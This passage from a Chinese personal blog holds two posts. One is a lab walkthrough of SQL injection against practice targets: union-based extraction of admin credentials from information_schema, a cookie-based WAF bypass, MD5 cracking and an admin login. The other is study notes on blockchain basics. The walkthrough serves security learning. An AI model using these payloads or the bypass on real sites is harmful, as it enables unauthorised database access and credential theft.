      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/10/07/SQL%E6%B3%A8%E5%85%A501/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/" class="post-title-link" itemprop="url">SQL注入01</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-10-07 22:04:44" itemprop="dateCreated datePublished" datetime="2021-10-07T22:04:44+08:00">2021-10-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-08 09:20:33" itemprop="dateModified" datetime="2021-10-08T09:20:33+08:00">2021-10-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p><strong>sql注入的一般分类（按照注入数据类型）：</strong></p>
<p>​    （1）数字型注入；当输入的参数为整型时，则有可能存在数字型注入漏洞。</p>
<p>​    （2）字符型注入；当输入参数为字符串时，则可能存在字符型注入漏洞。</p>
<p>​    （3）其他类型（例如：搜索型注入、Cookie注入、POST注入等）。　</p>
<p><strong>sql注入的高级分类(按照执行效果分类)：</strong></p>
<p>　　(1)基于布尔的盲注：即可以根据返回页面判断条件真假的注入。</p>
<p>　　(2)基于时间的盲注：即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断。</p>
<p>　　(3)基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<p>　　(4)联合查询注入：可以使用union的情况下的注入。</p>
<p>　　(5)堆查询注入：可以同时执行多条语句的注入。</p>
<p>　　(6)宽字节注入：利用gbk是多字节的编码，两个字节代表一个汉字</p>
<p>注意：一般SQL注入都是要利用多中注入手段的</p>
<p>学习补充链接：</p>
<p>1.<a target="_blank" rel="noopener" href="https://www.php.cn/safe/455989.html">https://www.php.cn/safe/455989.html</a></p>
<p>2.进阶：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-43169-1-1.html?from=bkyl">https://bbs.ichunqiu.com/thread-43169-1-1.html?from=bkyl</a></p>
<h2 id="例1：布尔盲注-联合查询-堆查询注入（无防火墙）"><a href="#例1：布尔盲注-联合查询-堆查询注入（无防火墙）" class="headerlink" title="例1：布尔盲注+联合查询+堆查询注入（无防火墙）"></a>例1：布尔盲注+联合查询+堆查询注入（无防火墙）</h2><p>   <strong><em>目标：获取账号密码</em></strong></p>
<p>靶场传送门：<a target="_blank" rel="noopener" href="http://rhiq8003.ia.aqlab.cn/">http://rhiq8003.ia.aqlab.cn/</a></p>
<p><strong>第0步：判断是否存在数据库存储</strong></p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093011830.png" alt="image-20210930093011830"></p>
<p>进入后</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093059714.png" alt="image-20210930093059714"></p>
<p><strong>第一步：判断是否存在sql注入漏洞</strong>（bool运算判断）</p>
<p><strong>构造 ：</strong>?id=1 and 1=1 ，回车，结果页面正常</p>
<p>说明：这里是布尔注入，构建了1=1的永真条件（这里的结果相当于没添加and 1=1，所以界面没变是正常</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093304245.png" alt="image-20210930093304245"></p>
<p><strong>构造：</strong> ?id=1 and 1=2 ,回车。</p>
<p>说明：1=2是永假条件，页面出现了变化（不正常），即状态回显了，可以利用这个应答效果；初步判断这里存在注入漏洞</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930093544124.png" alt="image-20210930093544124"></p>
<p><strong>第二步：判断数据库字段数（order by）</strong></p>
<p><strong>构造：</strong> ?id=1 order by 1</p>
<p>结果：正常，（继续测试到出现回显错误为止。）</p>
<p>说明：order by函数是操作字段（列），如果第*列不存在，数据库会报错（回显报错）</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930094708112.png" alt="image-20210930094708112"></p>
<p><strong>构造：</strong>?id=1 order by 3</p>
<p>结果：页面回显出错（所以判断字段数（列数）为2）</p>
<p>说明：因为只是加了order by语句，相当于只是做了选择，但是没有进行其他操作，所以页面应该是不会变化的，除了order by操作出错，即选择的列不存在时</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930095141092.png" alt="image-20210930095141092"></p>
<p><strong>第三步：利用错误回显来判断回显点（bool运算+select语句）</strong></p>
<p><strong>构造：</strong> ?id=1 and 1=2 union select 1,2 </p>
<p>结果：页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容</p>
<p>说明：要在回显错误的界面上进行测试，select后面的字段个数（这里的1,2）是由步骤二判断出的字段数决定的。</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930095601309.png" alt="image-20210930095601309"></p>
<p><strong>第四步：查询相关内容</strong></p>
<p>备注：都要在回显错误的界面操作</p>
<p><strong>查询当前数据库名</strong>：构造 ?id=1 and 1=2 union select 1,database() 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930100557017.png" alt="image-20210930100557017"></p>
<p><strong>查询当前数据库版本</strong>：构造 ?id=1 and 1=2 union select 1,version() ，再回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930100726382.png" alt="image-20210930100726382"></p>
<p><strong>查询当前数据库 表名</strong></p>
<p>构造 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 。绝大数情况下，管理员的账号密码都在admin表里。</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930100819524.png" alt="image-20210930100819524"></p>
<p><strong>知识补充</strong></p>
<p>（1）系统参数/变量：对于mysql、SQL、Infobright等数据库，information_schema数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
<p><strong>information_schema.tables</strong>存储了数据表的元数据信息，下面对常用的字段进行介绍：</p>
<ul>
<li>table_schema: 记录<strong>数据库名</strong>；</li>
<li>table_name: 记录<strong>数据表名</strong>；</li>
<li>column_name ：记录<strong>字段名</strong></li>
<li>engine : 存储<strong>引擎</strong>；</li>
<li>table_rows: 关于表的粗略行估计；</li>
<li>data_length : 记录<strong>表的大小</strong>（单位字节）；</li>
<li>index_length : 记录表的<strong>索引的大小</strong>；</li>
<li>row_format: 可以查看数据表<strong>是否压缩</strong>过；</li>
</ul>
<p>（2）limit 0,1 ：从第0位开始，读取1个元素（数据）；这里回显内容地方只有一个，所以limit第二个参数一直都是1.</p>
<p><strong>查询字段名</strong></p>
<p>穷举查出 admin 表里 有  id  username  password  三个字段</p>
<p>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150327642.png" alt="image-20210930150327642"></p>
<p>构造 ?id=1 and 1=2 union select 1,column_name from  information_schema.columns where table_schema=database() and  table_name=’admin’ limit 1,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150451365.png" alt="image-20210930150451365"></p>
<p>构造 ?id=1 and 1=2 union select 1,column_name from  information_schema.columns where table_schema=database() and  table_name=’admin’ limit 2,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150508924.png" alt="image-20210930150508924"></p>
<p><strong>查询字段内容</strong></p>
<p>构造 ?id=1 and 1=2 union select 1,username from admin  limit 0,1 回车查看<strong>账号名</strong></p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150755055.png" alt="image-20210930150755055"></p>
<p>查到了账号名，再<strong>查看密码</strong></p>
<p>构造 ?id=1 and 1=2 union select 1,password from admin  limit 0,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930151402562.png" alt="image-20210930151402562"></p>
<p><strong><em>到这里就窃取到了数据库管理员（账户）的账户（admin）和密码（hellohack）了</em></strong></p>
<p><strong>查看数据（内容）条数</strong></p>
<p>（密码）一直查，直到位空（回显错误），；构造 ?id=1 and 1=2 union select 1,password from admin  limit 1,1 回车</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930150918351.png" alt="image-20210930150918351"></p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930151059407.png" alt="image-20210930151059407"></p>
<h2 id="例2：利用cookie绕过WAF网络防火墙"><a href="#例2：利用cookie绕过WAF网络防火墙" class="headerlink" title="例2：利用cookie绕过WAF网络防火墙"></a>例2：利用cookie绕过WAF网络防火墙</h2><p>   <strong><em>目标：获取账号密码</em></strong></p>
<p>靶场传送门：<a target="_blank" rel="noopener" href="http://kypt8004.ia.aqlab.cn/">http://kypt8004.ia.aqlab.cn/</a></p>
<p><strong>步骤0-1：判断是否存在sql注入漏洞</strong></p>
<p>具体过程和例1步骤0相同</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930194834400.png" alt="image-20210930194834400"></p>
<p><strong>步骤2：</strong>利用order by语句查询字段数</p>
<p>构造?id=171 order by 11，探测出字段数为10</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930195008905.png" alt="image-20210930195008905"></p>
<p><strong>步骤3：联合查询注入（测试）</strong></p>
<p>构造?id=171 union select 1,2,3,4,5,6,7,8,9,10 from admin，判断是否有admin这个表。</p>
<p>结果：经测试只要url出现select（查询）关键字，就会被防火墙拦截。。</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930195432374.png" alt="image-20210930195432374"></p>
<p>猜想：尝试将测试语句放到cookie里面，再发送给服务器，因为网页防护一般只拦截GET、POST传参。(绕过GET、POST请求的防火墙注入过滤)</p>
<p><strong>步骤4：利用web插件通过cookie注入</strong></p>
<p>说明：这里用了HackBar插件</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930200409869.png" alt="image-20210930200409869"></p>
<p><strong>查看回显效果并猜测是否存在admin表（+号代替空格，不然会出错）：</strong></p>
<p><strong>构造cookie：</strong>id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin</p>
<p>结果：没有出现数据库错误，这证明admin表是存在的。且第2、第3、7、8、9字段，可以用来猜测字段名，同时，可以直接回显在页面上。</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930200519006.png" alt="image-20210930200519006"></p>
<p><strong>查看username和password字段的值</strong>：</p>
<p>测试我们接着尝试猜测最常见的管理表字段名Username和Password，我们在2、3、7、8、9中任选两个，分别填入Username和Password，比如2和3：</p>
<p><strong>构建cookie：</strong>id=171+union+select+1,username,password,4,5,6,7,8,9,10+from+admin</p>
<p>结果得到：admin（username）、b9a2a2b5dffb918c（password）</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20211001105731391.png" alt="image-20211001105731391"></p>
<p>这应该就是管理员用户名和密码了，但管理员密码看起来有些奇怪。字母+数字的16位组合，很像md5的特征。</p>
<p>打开cmd5.com（解密站点）</p>
<p>将b9a2a2b5dffb918c进行解密得到密码welcome</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930203334045.png" alt="image-20210930203334045"></p>
<p><strong>步骤5：登录验证</strong></p>
<p>在主页url补/admin/，进入admin页面（kypt8004.ia.aqlab.cn/admin/），这个站貌似是南方的CMS，默认管理员后台是根目录的/admin/。</p>
<p>网站会自动重定向到kypt8004.ia.aqlab.cn/admin/Login.asp</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930203438599.png" alt="image-20210930203438599"></p>
<p>登录成功</p>
<p><img src="/2021/10/07/SQL%E6%B3%A8%E5%85%A501/image-20210930204247081.png" alt="image-20210930204247081"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">区块链基础知识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-09-08 12:42:58" itemprop="dateCreated datePublished" datetime="2021-09-08T12:42:58+08:00">2021-09-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-12-01 22:17:49" itemprop="dateModified" datetime="2021-12-01T22:17:49+08:00">2021-12-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/" itemprop="url" rel="index"><span itemprop="name">区块链</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="区块链基础知识"><a href="#区块链基础知识" class="headerlink" title="区块链基础知识"></a>区块链基础知识</h1><h2 id="区块链："><a href="#区块链：" class="headerlink" title="区块链："></a>区块链：</h2><p>​        分布式数据库（本质：一个个区块形成的链表），区块就像一个个账本，链就是将一个个账本联系起来的纽带；2个区块之间采用p2p方式链接，整体呈现网状分部；每个账本记录着一些公认的信息；综上所述，区块链就笼统的解释为分布式数据库。</p>
<p><strong>常用的共识算法/机制：</strong>工作量证明(Proof of Work，简称POW）、权益证明(Proof of Stake，简称POS）、委托权益证明(Delegated Proof of Stake，简称DPOS)、验证池共识机制Pool</p>
<p><strong>第一代区块链：</strong></p>
<p>​        去中心话的加密货币；典型例子就是比特币；每个加密货币都会产生一个伪随机数，可以用于加追踪和验证交易。<br>​    特点：安全性高，可追踪和验证、透明度高<br>​    缺点：耗时、成本高</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904100457419.png" alt="image-20210904100457419"></p>
<p><strong>第二代区块链（以太坊为例）：</strong></p>
<p>​        比方说，就像滴滴打车平台，以前是司机自己抢单，现在可以让司机交押金，然后由平台派单。相比第一代的比特币，以太坊大大提高了验证的效率。以前，人们想开发数字货币，要根据比特币的协议，将原来的软件代码拷贝下来，变成自己的版本。因为原始代码会随时升级，所以这些货币会变得不兼容，而以太坊允许人们可以直接在协议上修改代码，做二次开发就可以了<br>​    特点：兼容、高效率<br>​    缺点：应用单一</p>
<p><strong>第三代区块链：</strong></p>
<p>​        又有两个新的成果。一个是智能合约的诞生，智能合约可以跟踪所有跟合同有关的执行情况，这意味着，它可以约束各种违反合同的不法行为。第二个成果是，区块链技术诞生了一种新的融资方式和财富分配方式。股权分配是一个道理<br>​    特点：可伸缩性、互操作性（侧链），个性化</p>
<p><strong>不可篡改性</strong></p>
<p>​    1.原理：提交时，用区块算出一个哈斯值a；下载时，再用区块算出一个哈斯值b；若a=b，则判断为没被篡改（其实会有哈斯碰撞情况，不能说百分比正确），若a！=b，则一定被篡改过。(扩展，提高安全性：X=x+random随机数)    </p>
<p>​    2.应用：预测，哈斯算法X—-&gt;H(x),由于哈斯计算具有抗碰撞性质，所以，可以先公布H(x)，后面预测正确就可以公布X。</p>
<p><strong>区块链创建账号</strong></p>
<p>​    自己创建私钥和公钥；验证：用私钥签名，用公钥验证。关键，随机源的取值</p>
<p><strong>说明：以下图片出自b站北大肖老师授课视频，内容为学习笔记</strong></p>
<h3 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h3><p>​     挖矿模式/共识算法：pow（proof of work）</p>
<p>​    数据结构：区块链+merkle tree（如下图）；Merkle Tree 相比 Balance Tree，也是普通指针换成了哈希指针</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904102345008.png"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904102735472.png" alt="image-20210904102735472"></p>
<p><strong>挖矿：</strong>比特币挖矿的过程中实际就是找一个nonce，nonce跟区块的块头里的其他信息合一起作为输入，得出的哈希值要小于等于某个指定的目标预值。H(block header)≤target。block header 指块头，块头里有很多域，其中一个域是我们可以设置的随机数nonce，挖矿的过程是不停的试随机数，使得block header取哈希后落在指定的范围之内。</p>
<p><strong>共识机制</strong></p>
<p>​    1.区块链共识机制：哈斯共识</p>
<p>​    2.比特币共识机制：去中心化的账本的内容–记账权–求nonce（hash rate）–算力“投票”</p>
<p>目标预值（期望预值expected time=14天）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904165220798.png" alt="image-20210904165220798"></p>
<p>挖矿难度</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904165056764.png" alt="image-20210904165056764"></p>
<p><strong>比特币安全性保证：</strong></p>
<pre><code> 1.密码学机制：非对称加密</code></pre>
<p>​     2.共识机制</p>
<p><strong>分叉</strong></p>
<p>​    硬分叉：分叉永久存在；旧区块保守者不承认新区块模式，新区块模式承认旧区块模式，旧区块保守者永远只在旧区块链上挖矿。</p>
<p>​    软分叉：不会存在永久分叉；新区块先进者不承认旧区块模式，旧区块保守者赞同新区块模式，由于严重机制和共识机制的问题，只要大部分人更新了软件，分叉就不会永远存在；例如旧区块只验证a条件，而新区块要验证a、b两个区块;最终淘汰旧区块；如p2sh（pay to script hash）引入时就出现了软分叉)</p>
<p><strong>匿名性</strong></p>
<p>​    1.用户并不需要公布和捆绑的个人信息，只需要公布自己的公钥（现在连公钥都不需要，只需要公布公钥的哈希值）</p>
<p>​    2.多地址捆绑干扰，多个地址对应多个输出（一个用户可以开始多个账号，就有多个地址）</p>
<p>​    3.盲签方法</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210905153225483.png" alt="image-20210905153225483"></p>
<p>​    4.零知识证明：证明方只需要向验证法（直接/间接）证明某一个陈述，不需要透露其他陈述是正确的以外信息。（例如，A证明这个交易者是自己，A只需要给出一个相同的hash值即可）</p>
<p>​    零知识证明的数学基础：同态隐藏：如图是其三个定义性质</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210905152338057.png" alt="image-20210905152338057"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210905153053665.png" alt="image-20210905153053665"></p>
<ol start="5">
<li>零币和零钞</li>
<li>货币混合：用户们把比特币发给一个管理中心，管理中心再等额随机分配比特币（地址就不一样了，因为自己很有可能拿到的都是别人的币），管理中心还可以用比特币买其他的货币，经过几次转换，再把比特币返款给用户。</li>
</ol>
<p>打破匿名性：（1）在现实中进行交易（蹲点交易时间/地点等，再到链上查阅区块，可以分析出）</p>
<p><strong>不可溯源性</strong></p>
<p>​    这里说的溯源性是指找到用户的个人信息，这是由匿名性决定（主要）；但比特币的交易是可以溯源的，这里的指的是比特币的余额概念，例如可以判断是否进行了双花（double spending）操作，溯源使用的是UTXO模型。</p>
<p><strong>量子计算与比特币</strong></p>
<p>​        比特币只是第一代区块链的典型产物，如今已经开始研发第三代区块链了（第二段区块链典型产物：以太坊）。虽然量子计算有着惊人的算力，但是就目前知识发展来说，其对比特币威胁并非是致命的。原因如下：（1）量子计算机如今虽然发展迅速，但截止2020年12月，目前最强的量子计算机–九章，最理想状态下能控制76个量子比特；但要想破解比特币理论上需要控制4000个量子比特。而且目前量子计算机的量子控制的准确性还非常低，误差和出错率都很大。（2）目前，要想破解比特币，即使全球计算机同时运行，都破解不了（难度是2的256次方，因为其密钥值是256位）；而理论上，量子计算机只需要以分钟，甚至是秒做单位就可以破解。但这是在知道公钥的情况下破解。但是目前有的区块链技术已经不需要公布公钥了，只需要公布公钥的hash值，从公钥的hash值破解得到公钥，再从公钥破解到私钥；就目前的学术理论水平来说，即使是量子计算机也是不可能算出；首先是hash运算不可逆，而且其过程可能会出现有效数据丢失，而量子计算机主流认为的破解方法是暴力破解（该想法主要来源北京大学肖臻老师《区块链技术与应用》第13节课程的思考）（3）量子计算机是新型物理设备，而区块链只是软件；而且，目前用的是图灵计算机，属于不同的设备；再者，软件和硬件之间存在非常大的隔阂，以后很有可能会研发出量子计算机上的区块链（移植）。（4）目前区块链正在落实应用到我们的现实生活中，发展方向多，如：电子钞票（如：电子人民币）、电子发票、药品/食物标签追踪、公益、联盟链等等。存在既有理，所以区块链技术还是很有存在和发展的意义的。</p>
<p>​    总之，本人不认为区块链技术在量子计算机面前不值一提；量子计算机的发展还有很长的路，几年甚至几十年也不一定；按目前的发展速度，比特币在未来10年里应该是安全的（只是说在量子计算机威胁方面），至于以后的事，谁都不好说。再补充一下，量子计算机和区块链技术都是非常有用的技术，不能片面的评价谁好谁不好。</p>
<h3 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h3><p>​     <strong>挖矿模式/共识算法</strong>：pow（proof of work）</p>
<p>​    <strong>用户机制：</strong>（1）比特币每次交易必须把已有的币花光，例如，B有10个币，B与C的交易只需要3个币，那么B还要把7个币转给自己，这是由于要保证币的来源所决定的。以太坊只验证币的支出交易，这样可以防御双花攻击（double spending attack，由于支付者A不诚实，同一笔钱进行多次交易并发布到区块链上：A-B，A-C…，这样A用一笔钱进行了多次交易，还可以把钱转回到自己地址上）；随机而来会造成应答攻击（replay attack，由于接收者B不诚实，把A-B重复发到链上，这样其他矿工看到了，就一起写入区块，最后写到区块链上，B就收到重复的多笔交易）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210905170220959.png" alt="image-20210905170220959"></p>
<p>（2）比特币用户身份不确定性，一个用户可以拥有多个账号，多个身份，进而迷惑交易。而以太坊采用了身份确认/固定机制，一个用户可以由多个账号，但是身份固定。</p>
<p><strong>账户类型的数据结构</strong></p>
<p>​    <strong>问题1</strong>：为什么不像BTC那样将哈希表组织为Merkle Tree？</p>
<p>​    答：BTC存储的是交易信息，存到区块链后不需要更改，而且BTC是没有账户概念的，它是通过比特币的流通来计算余额。若ETH采用Merkle Tree，那么每次产生新的区块（新交易），就需要重新构建Merkle Tree，而且新区块产生的周期为10s，这样一来就不现实了；而且随着交易的增加，Merkle Tree会越来越大，这也不现实。（BTC的Merkle Tree大小是由区块大小决定的，区块包含的交易上限是4000个，那么Merkle Tree大小并不会太大）</p>
<p>​    <strong>问题2：</strong>我们可以不用hash表，直接在Merkle Tree上修改新添加的部分么？</p>
<p>​    答：目前Merkle Tree并未提供一个高效的查找和更新的方案，为保证查找效率和一致性，必须排序。</p>
<p>​    <strong>问题3：</strong>那采用排序的Sorted Merkle Tree可以吗？</p>
<p>​    答：虽然进行了排序，查找效率有了保证，但是新建账号时，地址是随机的，当插入的结点在中间非叶子结点部分，就需要进行重构，所以Sorted Merkle Tree插入、删除(实际上可以不删除)的代价太大。因此专家采用了MPT结构。</p>
<p><strong>MPT(Merkle Patricia tree/trie)</strong></p>
<p>​    trie：字典树/前缀树；保证一致性</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906102334640.png" alt="image-20210906102334640"></p>
<p>​    Patricia tree/trie：路径压缩trie/tree；提高效率</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906104758807.png" alt="image-20210906104758807"></p>
<p>MPT：将Merkle Tree与Patricia trie结合；提高了安全性和性能</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906105523041.png" alt="image-20210906105523041"></p>
<p><strong>挖矿技术</strong></p>
<p>​    （引入）<strong>莱特币挖矿技术</strong>：Memory Hard Mining Puzzle。1.设置一个较大的数组（128k大小），Seed为种子结点，通过Seed运算得到一个数并把这个数放到第一个位置；之后的每个数都是通过计算前一个数的hash值得到（逻辑相邻，数组位置其实不相邻，有点像链表，但是存在数组里），具有一定的前后依赖性。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906155836352.png" alt="image-20210906155836352"></p>
<p>2.在求解Puzzle时，从数组中取数，但是要取下一个数就必须要用当前的数求出下一个数的位置。（如A–&gt;B–&gt;C)；拿到数后，求出符合条件的nonce就算挖到。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906160530221.png" alt="image-20210906160530221"></p>
<p>补充：如果数组足够大，对于挖矿矿工来说，必须保存该数组以便查询，否则每次不仅计算位置，还要根据Seed计算整个数组数据，才能查询到对应位置的数据。这对于矿工来说，计算性能要求（如：内存）大幅度上升。不利于ASCI专业挖矿机挖矿（这类矿机计算性能好，但是内存小），但利于大众挖矿（普通的计算机满足该内存需求）</p>
<p>​    <strong>以太坊挖矿技术</strong>：以太坊的理念与莱特币类似，都是Memory Hard Mining Puzzle，但具体设计上与莱特币不同。以太坊中，设计了两个数据集，一大一小；小的为16MB的cache，大的数据集为1G的dataset(DAG)。其关系为，1G的数据集是通过16MB数据集生成而来的。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906162108463.png" alt="image-20210906162108463"></p>
<p>​    问：为什么要设计一大一小的数据集？</p>
<p>​    答：大的数据集是为了抵抗ASCI矿机，但对于轻节点并不友好（因为轻节点不用挖矿，它只是使用）；于是便有了小数据集，它给轻节点提供了检验功能。</p>
<p>​    <strong>DAG生成过程：</strong>大的数组中每个元素都是从小数组中按照伪随机顺序读取一些元素，方法同莱特币中相同。如第一次读取A位置数据，对当前哈希值更新迭代算出下一次读取位置B，再进行哈希值更新迭代计算出C位置元素。如此来回迭代读取256次，最终算出一个数作为DAG中第一个元素，如此类推，求出DAG的每一个元素。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906162255374.png" alt="image-20210906162255374"></p>
<p>​    <strong>以太坊挖矿过程：</strong>目标是求出一个符合要求的nonce。首先根据block header和nonce运算得出第一个初始hash，根据hash映射到初始位置A（A后一个位置为A‘）；然后用A和A’运算得到下一个位置B，如此类推，迭代64次，共读取128个数；最后计算出一个hash值。若符合条件，则算挖矿成功；若不符合则要重新选择nonce进行重复操作，直到当前的区块挖出或被挖出（若先被别人挖出，block header就变了，则要准备挖下一个区块）</p>
